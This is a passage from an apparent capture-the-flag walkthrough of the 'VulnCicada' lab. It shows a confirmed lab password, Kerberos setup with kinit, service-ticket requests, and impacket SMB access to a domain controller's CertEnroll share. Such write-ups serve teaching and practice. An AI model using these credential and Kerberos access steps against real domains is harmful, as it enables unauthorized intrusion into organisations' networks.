+</span></span><span style=display:flex><span>2025/07/03 11:49:05 &gt;  Done! Tested <span style=color:#ae81ff>11</span> logins <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> successes<span style=color:#f92672>)</span> in 0.213 seconds
+</span></span></code></pre></div><p>So Rosie <em>IS</em> using Cicada123 as her password; we just need to auth with Kerberos instead. <em><strong>cracks knuckles</strong></em></p><p>Let&rsquo;s start by setting up <code>/etc/krb5.conf</code> on our attacker machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>libdefaults<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    default_realm <span style=color:#f92672>=</span> CICADA.VL
+</span></span><span style=display:flex><span>    dns_lookup_realm <span style=color:#f92672>=</span> false
+</span></span><span style=display:flex><span>    dns_lookup_kdc <span style=color:#f92672>=</span> false
+</span></span><span style=display:flex><span>    ticket_lifetime <span style=color:#f92672>=</span> 24h
+</span></span><span style=display:flex><span>    forwardable <span style=color:#f92672>=</span> true
+</span></span><span style=display:flex><span>    rdns <span style=color:#f92672>=</span> false
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>realms<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    CICADA.VL <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>        kdc <span style=color:#f92672>=</span> DC-JPQ225.cicada.vl:88
+</span></span><span style=display:flex><span>        admin_server <span style=color:#f92672>=</span> DC-JPQ225.cicada.vl:749
+</span></span><span style=display:flex><span>        default_domain <span style=color:#f92672>=</span> cicada.vl
+</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>domain_realm<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>    .cicada.vl <span style=color:#f92672>=</span> CICADA.VL
+</span></span><span style=display:flex><span>    cicada.vl <span style=color:#f92672>=</span> CICADA.VL
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌─<span style=color:#f92672>[</span>chasepd@THE-HACKINATOR<span style=color:#f92672>]</span>─<span style=color:#f92672>[</span>~/htb/vulncicada<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└──╼ $kinit Rosie.Powell@CICADA.VL
+</span></span><span style=display:flex><span>Password <span style=color:#66d9ef>for</span> Rosie.Powell@CICADA.VL: 
+</span></span><span style=display:flex><span>┌─<span style=color:#f92672>[</span>chasepd@THE-HACKINATOR<span style=color:#f92672>]</span>─<span style=color:#f92672>[</span>~/htb/vulncicada<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└──╼ $klist
+</span></span><span style=display:flex><span>Ticket cache: FILE:/tmp/krb5cc_1000
+</span></span><span style=display:flex><span>Default principal: Rosie.Powell@CICADA.VL
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Valid starting       Expires              Service principal
+</span></span><span style=display:flex><span>07/03/2025 11:53:55  07/03/2025 21:53:55  krbtgt/CICADA.VL@CICADA.VL
+</span></span><span style=display:flex><span>	renew <span style=color:#66d9ef>until</span> 07/04/2025 11:53:52
+</span></span></code></pre></div><p>Sure enough, we have a valid ticket.</p><p>We can export it to tell impacket and other tools where to get at it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export KRB5CCNAME<span style=color:#f92672>=</span>/tmp/krb5cc_1000
+</span></span></code></pre></div><p>Let&rsquo;s request service tickets for several services and see what we can do:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $kvno HOST/DC-JPQ225.cicada.vl@CICADA.VL
+</span></span><span style=display:flex><span>HOST/DC-JPQ225.cicada.vl@CICADA.VL: kvno <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>
+</span></span><span style=display:flex><span>└──╼ $kvno HTTP/DC-JPQ225.cicada.vl@CICADA.VL
+</span></span><span style=display:flex><span>HTTP/DC-JPQ225.cicada.vl@CICADA.VL: kvno <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>
+</span></span><span style=display:flex><span>└──╼ $klist
+</span></span><span style=display:flex><span>Ticket cache: FILE:/tmp/krb5cc_1000
+</span></span><span style=display:flex><span>Default principal: Rosie.Powell@CICADA.VL
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Valid starting       Expires              Service principal
+</span></span><span style=display:flex><span>07/03/2025 11:53:55  07/03/2025 21:53:55  krbtgt/CICADA.VL@CICADA.VL
+</span></span><span style=display:flex><span>	renew <span style=color:#66d9ef>until</span> 07/04/2025 11:53:52
+</span></span><span style=display:flex><span>07/03/2025 12:01:09  07/03/2025 21:53:55  HTTP/DC-JPQ225.cicada.vl@CICADA.VL
+</span></span><span style=display:flex><span>	renew <span style=color:#66d9ef>until</span> 07/04/2025 11:53:52
+</span></span><span style=display:flex><span>07/03/2025 12:02:37  07/03/2025 21:53:55  HOST/DC-JPQ225.cicada.vl@CICADA.VL
+</span></span><span style=display:flex><span>	renew <span style=color:#66d9ef>until</span> 07/04/2025 11:53:52
+</span></span></code></pre></div><p>We&rsquo;re able to get in via SMB:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $impacket-smbclient -k -no-pass cicada.vl/Rosie.Powell@DC-JPQ225.cicada.vl
+</span></span><span style=display:flex><span>Impacket v0.11.0 - Copyright <span style=color:#ae81ff>2023</span> Fortra
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Type help <span style=color:#66d9ef>for</span> list of commands
+</span></span><span style=display:flex><span><span style=color:#75715e># shares</span>
+</span></span><span style=display:flex><span>ADMIN$
+</span></span><span style=display:flex><span>C$
+</span></span><span style=display:flex><span>CertEnroll
+</span></span><span style=display:flex><span>IPC$
+</span></span><span style=display:flex><span>NETLOGON
+</span></span><span style=display:flex><span>profiles$
+</span></span><span style=display:flex><span>SYSVOL
+</span></span></code></pre></div><p>Best of all we seem to have access to the CertEnroll share:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># use CertEnroll</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ls</span>
+</span></span><span style=display:flex><span>drw-rw-rw-          <span style=color:#ae81ff>0</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:29:36 <span style=color:#ae81ff>2025</span> .
+</span></span><span style=display:flex><span>drw-rw-rw-          <span style=color:#ae81ff>0</span>  Fri Sep <span style=color:#ae81ff>13</span> 09:17:59 <span style=color:#ae81ff>2024</span> ..
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>741</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>941</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>10<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>10<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>11<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>11<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>12<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>12<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>13<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>13<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>14<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>14<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>15<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>15<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>16<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>16<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>17<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>17<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>18<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>18<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>19<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>19<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>741</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>941</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>20<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>20<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>21<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>21<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>22<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>22<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>23<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>23<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>24<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>24<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>25<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>25<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>26<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>26<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>27<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>27<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>742</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:27 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>28<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>943</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:27 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>28<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>741</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>3<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>941</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>3<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>741</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>4<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>941</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>4<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>741</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>5<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>941</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>5<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>741</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>6<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>941</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>6<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>741</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>7<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>941</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>7<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>741</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>8<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>941</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>8<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>741</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>9<span style=color:#f92672>)</span>+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>941</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:28 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>9<span style=color:#f92672>)</span>.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>736</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA+.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>933</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:29 <span style=color:#ae81ff>2025</span> cicada-DC-JPQ225-CA.crl
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1385</span>  Sun Sep <span style=color:#ae81ff>15</span> 07:18:43 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>0-1<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Sun Sep <span style=color:#ae81ff>15</span> 01:51:18 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Sun Sep <span style=color:#ae81ff>15</span> 07:18:43 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>1-0<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Sun Sep <span style=color:#ae81ff>15</span> 07:18:43 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>1-2<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:44:43 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>10<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Apr <span style=color:#ae81ff>10</span> 23:48:18 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>10-11<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:57:00 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>10-9<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:58:25 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>11<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Apr <span style=color:#ae81ff>10</span> 23:48:18 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>11-10<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Apr <span style=color:#ae81ff>10</span> 23:48:18 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>11-12<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Apr <span style=color:#ae81ff>10</span> 03:00:22 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>12<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Apr <span style=color:#ae81ff>10</span> 23:48:18 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>12-11<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Apr <span style=color:#ae81ff>10</span> 23:48:18 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>12-13<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Apr <span style=color:#ae81ff>10</span> 03:03:13 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>13<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Apr <span style=color:#ae81ff>10</span> 23:48:18 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>13-12<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Tue Jun  <span style=color:#ae81ff>3</span> 04:21:47 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>13-14<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Apr <span style=color:#ae81ff>10</span> 23:49:41 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>14<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Tue Jun  <span style=color:#ae81ff>3</span> 04:22:11 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>14-13<span style=color:#f92672>)</span>.crt
